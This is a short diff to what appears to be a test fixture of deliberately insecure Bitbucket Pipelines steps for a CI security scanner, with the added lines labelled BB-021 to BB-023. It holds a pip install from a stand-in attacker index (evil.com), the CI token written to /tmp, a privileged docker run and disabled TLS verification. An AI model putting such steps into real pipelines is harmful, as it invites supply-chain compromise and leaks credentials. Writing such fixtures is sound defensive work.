@@ -56,6 +56,12 @@ pipelines:
           - docker run --privileged myimage
           - pip install --index-url http://evil.com/simple/ pkg
           - echo "$BITBUCKET_TOKEN" >> /tmp/token.txt
+          # BB-021: package install without lockfile enforcement.
+          - npm install
+          # BB-022: dependency update bypasses lockfile pins.
+          - pip install --upgrade requests
+          # BB-023: TLS verification bypass.
+          - git config --global http.sslVerify false
         after-script:
           - 'curl -H "Authorization: Bearer $BITBUCKET_TOKEN" https://api.example.com/notify'
 
